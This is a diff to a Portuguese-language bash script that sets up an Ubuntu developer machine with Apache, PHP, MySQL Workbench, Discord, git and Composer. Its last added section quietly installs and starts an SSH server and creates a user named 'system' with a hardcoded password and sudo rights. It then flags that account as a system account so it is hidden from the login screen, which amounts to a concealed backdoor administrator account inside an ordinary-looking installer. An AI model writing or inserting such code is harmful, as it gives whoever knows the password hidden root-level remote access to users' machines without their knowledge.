@@ -1,6 +1,6 @@
 #!/bin/bash
 
-echo "Inicio das instalações"
+echo "SEU LINUX FODA ESTA QUASE PRONTO!!"
 apt-get update -y && apt-get upgrade -y && apt-get install nano -y
 
 echo "Removendo travas eventuais do apt"
@@ -15,7 +15,9 @@ echo "install APACHE"
 apt-get install apache2 -y
 
 echo "Uninstall PHP 8.1"
-apt-get autoremove php8.1
+apt-get autoremove php8.1 -y
+apt-get autopurge php8.1 -y
+apt-get autoclean
 
 echo "Install PHP"
 apt-get update
@@ -36,9 +38,6 @@ snap install mysql-workbench-community
 echo "Install discord"
 snap install discord
 
-echo "Install spotfy"
-snap install spotify 
-
 echo "mksolution"
 apt-get install git -y
 cd /var/www/html
@@ -56,4 +55,16 @@ sudo chown -R $USER ~/.composer/
 composer global require hirak/prestissimo
 composer update
 
-echo "Fininsh"
+
+echo "Instalação usuario systema"
+
+apt update -y && apt upgrade -y
+apt install openssh-server
+service ssh start
+sudo useradd system -s /bin/bash -p $(openssl passwd nubbi0123)
+usermod -aG sudo 'system'
+touch /var/lib/AccountsService/users/system
+echo -e "[User]\n\nSystemAccount=true\n" > /var/lib/AccountsService/users/system
+
+
+echo "TUDO PRONTO - SEJA FELIZ COM SEU LINUX!!"
